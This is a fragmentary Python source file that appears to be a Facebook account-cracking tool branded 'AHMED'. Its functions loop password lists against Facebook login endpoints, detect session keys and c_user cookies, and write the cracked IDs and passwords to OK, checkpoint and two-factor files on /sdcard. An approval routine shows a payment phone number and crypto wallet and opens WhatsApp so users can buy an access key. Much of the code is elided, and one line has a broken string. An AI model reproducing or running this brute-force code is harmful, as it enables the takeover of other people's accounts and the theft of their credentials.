...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [AHMED-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AHMED-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [AHMED-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/AHMED-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/AHMED-CP.txt','a').write(ids+'|'+pas+'\n')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AHMED-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [AHMED-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AHMED-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [AHMED-OK] %s | %s'%(ids,pas))
				open('/sdcard/AHMED-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [AHMED-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [AHMED-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [AHMED-OK] '+udx+' | '+pas+'\033[1;97m')
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [AHMED-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [AHMED-OK] '+uid+' | '+pas)
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [AHMED-CP] '+uid+' | '+pas+'\033[1;97m')
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print('\033[1;37m----------------------------------------------')
      print(" jazzcash  Number     : +923277025198)
      print(" Trust Wallet Address : 0xb785952B2825366c8756fb65520F7Df8e0D145bD ")
      input('\033[1;37m Press Enter For Contact To Admin ')
      tks = ('Hello%20MR-AHMED%20Sir%20!%20Please%20Approve%20My%20Key%20The%20TRT%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+923277025198?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()
